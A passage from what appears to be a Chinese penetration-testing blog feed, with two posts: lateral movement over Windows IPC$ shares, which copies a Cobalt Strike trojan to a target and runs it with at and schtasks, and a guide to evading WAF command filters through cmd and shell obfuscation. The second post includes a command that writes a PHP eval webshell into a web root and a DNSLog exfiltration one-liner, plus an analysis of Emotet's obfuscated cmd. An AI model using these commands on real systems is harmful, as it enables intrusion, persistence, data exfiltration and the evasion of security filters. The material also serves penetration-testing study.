src="/2022/11/01/ipc/image-20221101153110495.png" alt="image-20221101153110495" style="zoom:50%;"><img src="/2022/11/01/ipc/image-20221101153150564.png" alt="image-20221101153150564" style="zoom:50%;"><p>访问/删除路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\10.1.10.7\c$   #直接访问</span><br><span class="line">net use z: /del     #删除映射的z盘</span><br><span class="line">net use * /del      #删除全部,会有提示要求按y确认</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share       #查看自己的共享</span><br></pre></td></tr></table></figure><p>复制文件到对方服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy abc.exe \\win7\c$</span><br></pre></td></tr></table></figure><img src="/2022/11/01/ipc/image-20221101154049065.png" alt="image-20221101154049065" style="zoom:50%;"><h3 id="0x03-windows-计划任务">0x03 windows 计划任务</h3><h4 id="at命令">at命令</h4><p>接下来创建windows计划任务，自动执行木马反弹连接到攻击机器</p><p>在windows中常用的就是计划任务at和schtasks</p><blockquote><p>at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p></blockquote><p>at计划命令在实战中主要有两个用处：</p><p>一是在获取webshell后不能够执行系统命令的情况下可以用at命令将命令执行后写入txt再用type读取，二是利用at计划任务命令上线cs或者msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.52.141 16:40:00 cmd.exe /c &quot;命令 &gt; c:\result.txt&quot;</span><br><span class="line">type \\192.168.52.141\c$\result.txt</span><br></pre></td></tr></table></figure><p>二是利用at计划任务上线cs或msf，这里我使用的是cs生成的exe</p><p>1.首先与主机建立ipc连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ &quot;1qaz@WSX&quot; /user:fzm\user1</span><br></pre></td></tr></table></figure><p>2.确定主机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\10.1.10.7</span><br></pre></td></tr></table></figure><img src="/2022/11/01/ipc/image-20221101160157139.png" alt="image-20221101160157139" style="zoom:50%;"><p>3.使用cs生成木马利用copy命令拷贝到主机上</p><img src="/2022/11/01/ipc/image-20221101154049065.png" alt="image-20221101154049065" style="zoom:50%;"><p>4.使用at命令创建计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at \\&lt;靶机ip&gt; &lt;启动时间&gt; &lt;木马在靶机的位置&gt;</span><br><span class="line"></span><br><span class="line">at \\win7 16:24:00 c:\abc.exe</span><br></pre></td></tr></table></figure><img src="/2022/11/01/ipc/image-20221101162512318.png" alt="image-20221101162512318" style="zoom:50%;"><p><img src="/2022/11/01/ipc/image-20221101163225010.png" alt="image-20221101163225010"></p><h4 id="schtasks命令">schtasks命令</h4><p>在2008及以后的系统中已经将at命令废弃，改用schtasks命令代替了at命令，原因是因为schtasks命令比at命令使用起来更加灵活。</p><p>这里使用schtasks命令计划任务上线的思想跟at命令大同小异</p><p>1.与主机建立ipc连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.10\ipc$ &quot;abc12345.&quot; /user:fzm\administrator</span><br></pre></td></tr></table></figure><p>2.使用copy命令将exe复制到靶机里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy abc.exe \\10.1.10.10\c$</span><br></pre></td></tr></table></figure><p>3.查看靶机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\10.1.10.10</span><br></pre></td></tr></table></figure><p>4.使用schtasks创建名为test的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#/s 目标 /u 用户名 /p 密码  /tn 计划任务名  /tr 指定文件路径   /sc 执行次数 或频率   /st 开始时间</span><br><span class="line"></span><br><span class="line">//c  /create /TN test /TR C:\abc.exe /SC once /ST 17:32 #本地执行</span><br><span class="line">schtasks /create /s 10.1.10.10 /u &quot;fzm\administrator&quot; /p &quot;abc12345.&quot; /tn 8 /tr c:/2.exe  /sc once /st 17:33</span><br></pre></td></tr></table></figure><p><img src="/2022/11/01/ipc/image-20221101173427414.png" alt="image-20221101173427414"></p><p><img src="/2022/11/01/ipc/image-20221101173409241.png" alt="image-20221101173409241"></p><p>可以用如下schtasks命令查看创建的计划任 cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn 8</span><br></pre></td></tr></table></figure><img src="/2022/11/01/ipc/image-20221101173905760.png" alt="image-20221101173905760" style="zoom:50%;"><p>5.删除计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /tn 8</span><br></pre></td></tr></table></figure><p><code>schtasks /create</code>创建计划任务，可加参数如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/sc   计划任务类型，可选值为MINUTE、HOURLY、DAILY、WEEKLY、ONCE、ONSTART、ONLOGON、ONIDLE、MONTHLY、ONEVENT</span><br><span class="line">/tn   计划任务名称，后续查询、修改、删除、执行时使用</span><br><span class="line">/tr   需要运行的程序或命令，传入的命令中间如果有空格会被截断为程序和参数，因此需要将双引号转义并传入。</span><br><span class="line">/ru   运行任务的用户账户名，不使用此参数的话使用执行schtasks命令的账户运行计划任务</span><br><span class="line">/rp   运行任务的用户账户密码</span><br><span class="line">/mo   指定任务在计划类型中的运行间隔</span><br><span class="line">/d    指定任务在一个月或者星期的某一天运行，只适用于MONTHLY和WEEKLY类型。</span><br><span class="line">/m    指定任务在某个月运行，只适用于MONTHLY类型。</span><br><span class="line">/i    当计划任务类型为ONIDLE时，运行任务前计算机处于空闲状态的分钟数。</span><br><span class="line">/st    当计划任务类型为MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY时使用，指定任务的开始时间，默认为本地计算机的当前时间。</span><br><span class="line">/ri   指定计划任务的重复间隔，以分钟为单位。不适合计划类型：MINUTE、HOURLY、ONSTART、ONLOGON、ONIDLE</span><br><span class="line">/et   指定计划任务的结束时间，适用于计划类型：MINUTE、HOURLY， 在指定的结束时间之后，schtasks 不会再次启动任务，除非当前系统时间调回开始时间。默认情况下，没有结束时间。</span><br><span class="line">/du   指定任务计划的持续时间，与/et类似，默认情况下没有持续时间。</span><br><span class="line">/k    在指定计划任务的结束时间或持续时间后停止任务，如果不加此参数，则在时间到了会继续运行或者重启该任务。</span><br><span class="line">/it   只在用户登录时运行</span><br><span class="line">/z    在任务计划完成后删除任务计划</span><br><span class="line">/f    在创建任务时如果任务已存在不显示警告</span><br><span class="line">/RL   为作业设置运行级别。有效值为LIMITED 和 HIGHEST。默认值为 LIMITED。</span><br><span class="line">/F    如果指定的任务已经存在，则强制创建任务并抑制警告。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当使用了/sc参数为MINUTE、HOURLY、DAILY、WEEKLY时，我们需要指定/mo运行的间隔时间</span><br><span class="line"></span><br><span class="line">    MINUTE:  1 到 1439 分钟。</span><br><span class="line">    HOURLY:  1 - 23 小时。</span><br><span class="line">    DAILY:   1 到 365 天。</span><br><span class="line">    WEEKLY:  1 到 52 周。</span><br><span class="line">    ONCE:   </span><br><span class="line">    ONSTART: </span><br><span class="line">    ONLOGON: </span><br><span class="line">    ONIDLE:  </span><br><span class="line">    MONTHLY: 1 到 12，或</span><br><span class="line">    FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。</span><br><span class="line">    ONEVENT:  XPath 事件查询字符串。</span><br></pre></td></tr></table></figure><blockquote><p>在使用<code>schtasks</code>命令时，会在系统中留下日志文件<code>C:\Windows\Tasks\SCHEDLGU.txt</code>如果执行<code>schtasks</code>命令后没有回显，可配合<code>ipc$</code>执行文件，使用<code>type</code>命令远程查看执行结果</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过WAF运行命令执行漏洞的方法</title>
      <link href="/2022/10/28/bypass/"/>
      <url>/2022/10/28/bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过WAF运行命令执行漏洞的方法">绕过WAF运行命令执行漏洞的方法</h2><h3 id="0x01-Windows（不区分大小写）"><strong>0x01 Windows（不区分大小写）</strong></h3><h4 id="1-1-符号和命令的关系">1.1 符号和命令的关系</h4><p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p><p><code>&quot;</code>和<code>^</code>是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p><p>这里有几个需要注意的地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在命令中可以有无数个&quot;，但是不能有两个连续的^</span><br><span class="line">在命令中如果&quot;在^之前，则&quot;的个数必须为偶数个</span><br><span class="line">在命令中如果&quot;在^之后，并且带有参数，则命令中的&quot;个数必须为偶数</span><br><span class="line">在命令的参数中，单个字符前后&quot;的个数只能有一个或者两个</span><br><span class="line">如果成对的括号中间有&quot;则&quot;的个数也必须为偶数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">whoami    //正确执行</span><br><span class="line">WhOAmi    //正确执行</span><br><span class="line">Who&quot;amI    //正确执行</span><br><span class="line">((Who&quot;amI))    //错误</span><br><span class="line">((Who&quot;&quot;amI))    //正确执行</span><br><span class="line">Who&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;amI    //正确执行</span><br><span class="line">who&quot;&quot;&quot;a^mi    //错误</span><br><span class="line">who&quot;&quot;&quot;&quot;a^mi    //正确执行</span><br><span class="line">whoa^m&quot;&quot;&quot;&quot;i    //正确执行</span><br><span class="line">whoa^m&quot;&quot;&quot;i    //正确执行</span><br><span class="line">whoa^^mi    //错误</span><br><span class="line">n^e^t user    //正确执行</span><br><span class="line">n^e^t&quot;&quot; user    //正确执行</span><br><span class="line">n^e^t&quot;&quot;&quot; user    //错误</span><br><span class="line">n^e^t&quot;&quot; u&quot;ser    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;ser    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;&quot;ser    //错误</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;er    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;&quot;er    //正确执行</span><br><span class="line">n^e^t&quot;&quot; u&quot;&quot;s&quot;&quot;&quot;er    //错误</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171627591.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628011.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628216.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628159.png" alt="图片"></p><h4 id="1-2-了解set命令和Windows变量">1.2 了解set命令和Windows变量</h4><p>在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。</p><p><img src="/2022/10/28/bypass/640-20221028171627754.png" alt="图片"></p><p>这样就可以进行命令执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=whoami    //赋值变量为whoami%cmd%              //执行命令</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628144.png" alt="图片"></p><p>也可以赋值多个变量，拼接利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=whoset cmd2=amset cmd3=i%cmd1%%cmd2%%cmd3%</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171627857.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=whoset cmd3=i%cmd1%am%cmd3%</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171627973.png" alt="图片"></p><p>也可以与1.2的内容进行合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=wh&quot;&quot;oset cmd3=i&quot;&quot;&quot;%cmd1%a^m%cmd3%</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628088.png" alt="图片"></p><p>也可以在赋值的时候加入空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd1=s&quot;&quot;erset cmd2=t uset cmd3=n^e%cmd3%%cmd2%%cmd1%</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628125.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cmd /C &quot;set cmd1=s&quot;&quot;er &amp;&amp; set cmd2=t u &amp;&amp; set cmd3=n^e &amp;&amp; call %cmd3%%cmd2%%cmd1%&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628201.png" alt="图片"></p><p>当使用<code>cmd /V:ON</code>或<code>cmd /V:O</code>时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V:ON /C &quot;set cmd=net user &amp;&amp; !cmd!&quot;cmd /V:O /C &quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628251.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628284.png" alt="图片"></p><h4 id="1-3-Windows切割字符串">1.3 Windows切割字符串</h4><p>拿whoami举例，实践Windows切割字符串的语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set cmd=whoami</span><br><span class="line">%cmd:~0% //取出a的值中的所有字符此时正常执行whoami</span><br><span class="line">%cmd:~0,1% //取出a的值，从第0个位置开始，取1个值此时因为w总共就1个字符</span><br><span class="line">%cmd:~0,6% //取出a的值，从第0个位置开始，取6个值此时因为whoami总共就6个字符</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628290.png" alt="图片"></p><p>由此可以看出来截取字符串的语法为<code>%变量名:~x,y%</code>即从变量第x位开始，截取y个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;set str=0123456789</span><br><span class="line">C:\Users\a&gt;echo %str:~-1%</span><br><span class="line">9</span><br><span class="line">从最后1位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-6%</span><br><span class="line">456789</span><br><span class="line">从倒数第6位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-9%</span><br><span class="line">123456789</span><br><span class="line">从倒数第9位开始取整个字符串</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,2%</span><br><span class="line">12</span><br><span class="line">从倒数第9位开始取2位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,4%</span><br><span class="line">1234</span><br><span class="line">从倒数第9位开始取4位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,-2%</span><br><span class="line">1234567</span><br><span class="line">从倒数第9位开始少取最后2位</span><br><span class="line">C:\Users\a&gt;echo %str:~-9,-4%</span><br><span class="line">12345</span><br><span class="line">从倒数第9位开始少取最后4位</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628287.png" alt="图片"></p><p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p><p><img src="/2022/10/28/bypass/640-20221028171628396.png" alt="图片"></p><p>我们可以拼命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;echo %COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi</span><br><span class="line">Whoami</span><br><span class="line">C:\Users\a&gt;%COMPUTERNAME:~0,1%h%windir:~-3,1%%HOMEPATH:~-1%mi</span><br><span class="line">win-tbucg5qo47j\a</span><br><span class="line">C:\Users\a&gt;d^i^r%CommonProgramFiles:~10,1%%commonprogramfiles:~0,3% </span><br><span class="line">驱动器 C 中的卷没有标签。 卷的序列号是 5CE5-9A63</span><br><span class="line"> C:\ 的目录</span><br><span class="line">2022/03/12  00:20    &lt;DIR&gt;          JspStudy</span><br><span class="line">2022/07/09  20:04    &lt;DIR&gt;          MailMasterData</span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628332.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628391.png" alt="图片"></p><p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;set web=^&lt;^&gt;/@$_PHPOST[]?&#x27;e()val</span><br><span class="line">C:\Users\a&gt;echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% &gt; C:\phpstudy_pro\WWW\b.php</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628432.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171628443.png" alt="图片"></p><p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。</p><p>这里注意set不能以空格结尾否则，变量会将空格进行赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V:ON /C &quot; set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26  !lq:~4!&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628427.png" alt="图片"></p><p><strong>错误示范</strong></p><p>下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示</p><p><img src="/2022/10/28/bypass/640-20221028171628475.png" alt="图片"></p><p>分析Emotet木马中的cmd命令</p><p>Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。</p><p>现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容</p><p><img src="/2022/10/28/bypass/640-20221028171628711.png" alt="图片"></p><p>先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。</p><p><img src="/2022/10/28/bypass/640-20221028171628730.png" alt="图片"></p><p>下图为无意义的四个字符串，cmd会自动忽略。</p><p><img src="/2022/10/28/bypass/640-20221028171628657.png" alt="图片"></p><p>可以看出这里利用了cmd的系统环境变量<code>%comspec%</code>，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。</p><p><img src="/2022/10/28/bypass/640-20221028171628651.png" alt="图片"></p><p>去除无意义的字符串后可以化简为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /c for /f &quot; delims=vf= tokens=2&quot; %f in ( &#x27;assoc .cmd&#x27; ) do %f /V /R</span><br></pre></td></tr></table></figure><p>先利用<code>%comspec% /c</code>执行第一个for循环，再利用<code>for</code>循环的<code>/f</code>参数，在命令<code>assoc .cmd</code>结果<code>.cmd=cmdfile</code>中以字符v、f、=为分隔符，取第二列即是“<code>cmd</code>”。</p><p><img src="/2022/10/28/bypass/640-20221028171628589.png" alt="图片"></p><p>因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。</p><p><img src="/2022/10/28/bypass/640-20221028171628912.png" alt="图片"></p><p>这里自定义了一个环境变量<code>@</code>，等于一个1460长度的字符串。然后利用for循环的/L参数，遍历变量<code>@</code>：<code>for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!&amp; if %s equ 3 call %\:~-365%</code>，这个for循环自定义了环境变量&quot;<code>\</code>&quot;，还启用了延迟的环境变量扩展<code>!</code>，<code>!@:~%s,1!</code>表示循环变量<code>%s</code>从1459开始，步长为<code>-4</code>，到<code>3</code>结束，循环提取变量<code>@</code>中的字符，添加到<code>\</code>变量中。当<code>%s</code>到<code>3</code>的时候就会执行<code>\</code>中倒数365个字符组成的程序。</p><p><img src="/2022/10/28/bypass/640-20221028171628770.png" alt="图片"></p><h4 id="1-4-逻辑运算符在绕过中的作用">1.4 逻辑运算符在绕过中的作用</h4><p><code>|</code> 在cmd中，可以连接命令，且只会执行后面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami | ping -n 1 www.baidu.com   //只执行ping</span><br><span class="line">ping -n 1 www.baidu.com | whoami   //只执行whoami</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628924.png" alt="图片"></p><p><code>||</code> 只有在前面命令失败才执行后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 || whoami //不执行</span><br><span class="line">whoamiping xxx. || whoami //执行whoami</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628838.png" alt="图片"></p><p><code>&amp;</code>无论前面的命令是否能执行成功都会执行后面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; whoami //执行</span><br><span class="line">whoamiping xxx. &amp; whoami //执行whoami</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628793.png" alt="图片"></p><p><code>&amp;&amp;</code>前面命令为真才会执行后面的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; whoami //执行whoamiping xxx. &amp;&amp; whoami //不执行whoami</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628885.png" alt="图片"></p><h3 id="0x02-Linux（区分大小写）">0x02 Linux（区分大小写）</h3><h4 id="2-1-linux下的符号和逻辑运算符">2.1 linux下的符号和逻辑运算符</h4><p>linux中变量使用<code>$</code>来引用，<code>;</code>表示命令结束无论命令是否执行成功都会执行下一个命令，<code>| || &amp; &amp;&amp;</code>，与Windows一样，这里就不做赘述。</p><p>利用上面的符号可以进行拼接的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t=l;j=s;i=&quot; -al&quot;;$t$j$i</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628856.png" alt="图片"></p><h4 id="2-2-利用未被过滤的命令">2.2 利用未被过滤的命令</h4><p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.whjtmh.dnslog.cn</span><br></pre></td></tr></table></figure><p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p><p><img src="/2022/10/28/bypass/640-20221028171628981.png" alt="图片"></p><h4 id="2-3-linux符号之间的组合">2.3 linux符号之间的组合</h4><p>类似于Windows的<code>&quot;</code>和<code>^</code>linux也有类似的使用方法，就是利用变量和参数</p><p><strong>利用反斜杠绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who\ami</span><br></pre></td></tr></table></figure><p><strong>利用括号括起来（当做命令执行）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(whoa&#x27;&#x27;mi)</span><br></pre></td></tr></table></figure><p><strong>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`(echo whoami)`</span><br><span class="line">$(echo whoami)</span><br></pre></td></tr></table></figure><p><strong>利用Shell特殊变量绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who$*ami</span><br><span class="line">who$@ami</span><br><span class="line">who$1ami</span><br></pre></td></tr></table></figure><p><strong>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u?r/b?n/who?mi</span><br><span class="line">/*/*/whoam?</span><br><span class="line">/*/*i[n]/wh??mi</span><br></pre></td></tr></table></figure><p><strong>综合组合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*/*&quot;&quot;in/w&#x27;h&#x27;`dfds`??m$(sdf)i</span><br></pre></td></tr></table></figure><h4 id="2-4-linux切割字符串">2.4 linux切割字符串</h4><p>在linux中切割字符串的语法是${NAME:start:length}</p><p>与Windows相同这里不在赘述，只要区分大小写就可以</p><h4 id="2-5-绕过空格过滤">2.5 绕过空格过滤</h4><ul><li><p>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</p></li><li><p>利用大括号来绕过空格限制</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;ls,-al&#125;</span><br><span class="line">&#123;ping,-c,2,127.0.0.1&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171628971.png" 